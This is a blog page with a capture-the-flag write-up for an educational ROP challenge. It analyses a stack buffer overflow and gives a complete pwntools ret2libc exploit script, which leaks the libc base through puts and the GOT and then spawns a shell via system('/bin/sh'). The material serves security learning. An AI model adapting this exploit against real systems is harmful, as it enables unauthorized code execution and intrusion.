<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="ROP1 Challenge is from https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP
Analysis: From the decompiled code in ida, we can learn that the source code looks something like this:
int main() { 	char buf[256]; 	puts(&amp;#34;n132&amp;#34;); 	read(0, buf, 512); 	return 0; } Our goal is to replace puts with system and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=/notes/posts/rop1-writeup/><title>Rop1_writeup :: About Me — A simple theme for Hugo</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css><meta itemprop=name content="Rop1_writeup"><meta itemprop=description content="ROP1 Challenge is from https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP
Analysis: From the decompiled code in ida, we can learn that the source code looks something like this:
int main() { 	char buf[256]; 	puts(&#34;n132&#34;); 	read(0, buf, 512); 	return 0; } Our goal is to replace puts with system and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time."><meta itemprop=datePublished content="2022-04-10T18:53:03-04:00"><meta itemprop=dateModified content="2022-04-10T18:53:03-04:00"><meta itemprop=wordCount content="380"><meta itemprop=image content="/"><meta itemprop=keywords content><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/"><meta name=twitter:title content="Rop1_writeup"><meta name=twitter:description content="ROP1 Challenge is from https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP
Analysis: From the decompiled code in ida, we can learn that the source code looks something like this:
int main() { 	char buf[256]; 	puts(&#34;n132&#34;); 	read(0, buf, 512); 	return 0; } Our goal is to replace puts with system and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time."><meta property="og:title" content="Rop1_writeup"><meta property="og:description" content="ROP1 Challenge is from https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP
Analysis: From the decompiled code in ida, we can learn that the source code looks something like this:
int main() { 	char buf[256]; 	puts(&#34;n132&#34;); 	read(0, buf, 512); 	return 0; } Our goal is to replace puts with system and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time."><meta property="og:type" content="article"><meta property="og:url" content="/notes/posts/rop1-writeup/"><meta property="og:image" content="/"><meta property="article:section" content="notes"><meta property="article:published_time" content="2022-04-10T18:53:03-04:00"><meta property="article:modified_time" content="2022-04-10T18:53:03-04:00"><meta property="og:site_name" content="About Me"><meta property="article:published_time" content="2022-04-10 18:53:03 -0400 -0400"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>cd /Welcome/Racheltao</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/ style=color:#fe5186>About</a></li><li><a href=/notes style=color:#fe5186>Notes</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=/notes/posts/rop1-writeup/>Rop1_writeup</a></h2><div class=post-content><h1 id=rop1>ROP1</h1><p>Challenge is from <a href=https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP>https://github.com/n132/CTF-Challenges/tree/main/Educational/How2ROP</a></p><h3 id=analysis><strong>Analysis:</strong></h3><p>From the decompiled code in ida, we can learn that the source code looks something like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>256</span>];
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;n132&#34;</span>);
</span></span><span style=display:flex><span>		read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>512</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Our goal is to replace <code>puts</code> with <code>system</code> and replace the argument with “/bin/sh”. However, we cannot use libc.sym directly because PIE is enabled and libc will be loaded to different address every time, so that the runtime address for the program will be different every time. Therefore, our first goal is to leak the libc base address.</p><p>Because the script has an output function <code>puts</code>, we can leak the libc base address by overflowing the buffer and return to a <code>put</code> function, and output the base address by subtracting the libc <code>puts</code> address from the runtime puts address. Finally, with the base address, we return to the start of the <code>main</code> function and start our attack. We can overflow the buffer again and this time we return to the <code>system</code> function with “/bin/sh”.</p><h3 id=exploit>Exploit:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>context<span style=color:#f92672>.</span>arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;tmux&#39;</span>,<span style=color:#e6db74>&#39;split&#39;</span>,<span style=color:#e6db74>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>e<span style=color:#f92672>=</span>ELF(<span style=color:#e6db74>&#39;./pwn&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>process(<span style=color:#e6db74>&#39;./pwn&#39;</span>)
</span></span><span style=display:flex><span>sla             <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> a,b: p<span style=color:#f92672>.</span>sendlineafter(a,b)
</span></span><span style=display:flex><span>sa                      <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> a,b: p<span style=color:#f92672>.</span>sendafter(a,b)
</span></span><span style=display:flex><span>ra                      <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> a: p<span style=color:#f92672>.</span>readuntil(a)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>attach(p, <span style=color:#e6db74>&#39;b *0x400594&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e>#offset = 283552</span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;/lib/x86_64-linux-gnu/libc-2.23.so&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># find gadget (pop rdi, ret)</span>
</span></span><span style=display:flex><span>rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400603</span>
</span></span><span style=display:flex><span><span style=color:#75715e># leak puts(some)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># rdi puts(got) puts(plt) main</span>
</span></span><span style=display:flex><span>sla(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x100</span><span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>+</span>p64(rdi)<span style=color:#f92672>+</span>p64(e<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>got<span style=color:#f92672>.</span>puts)<span style=color:#f92672>+</span>p64(e<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>puts)<span style=color:#f92672>+</span>p64(e<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>main))
</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>readline()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0\0</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>-</span>libc<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>puts
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>warning(hex(base))
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> base
</span></span><span style=display:flex><span><span style=color:#75715e># attack : system(&#34;/bin/sh&#34;)</span>
</span></span><span style=display:flex><span>sla(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x100</span><span style=color:#f92672>+</span>p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>+</span>p64(rdi)<span style=color:#f92672>+</span>p64(next(libc<span style=color:#f92672>.</span>search(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)))<span style=color:#f92672>+</span>p64(libc<span style=color:#f92672>.</span>sym<span style=color:#f92672>.</span>system))
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span><span style=color:#75715e># pop rdi</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1.get system /bin/sh&#39;s address</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 2.base addres + offset</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 3. leak libc</span>
</span></span></code></pre></div><ol><li>We know that the buffer is 0x100 bytes long, so we fill the first 0x100 bytes with arbitrary characters (here we use “B”s).</li><li>Overwrite <code>rbp</code> with 0’s</li><li>Since <code>puts</code> takes the stuffs in <code>rdi</code> as argument, we can find gadgets that includes <code>pop rdi, ret</code> and return to puts. There’s one at<code>0x400603</code>.</li><li>The GOT table has the true address for <code>puts</code>, so we pass <code>e.sym.got.puts</code> to the <code>puts</code> function.</li><li>After we retrieved the runtime address for <code>puts</code>, we subtract the libc puts address from the runtime address to get libc base address.</li><li>After that, we can start our attack by returning to main and do buffer overflow again.</li><li>We do the same thing but this time replace <code>puts</code> with <code>system</code> and pass “/bin/sh” to the <code>system</code> function.</li><li>Run the script and pop the shell!</li></ol></div></article><hr><div class=post-info></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script></body></html>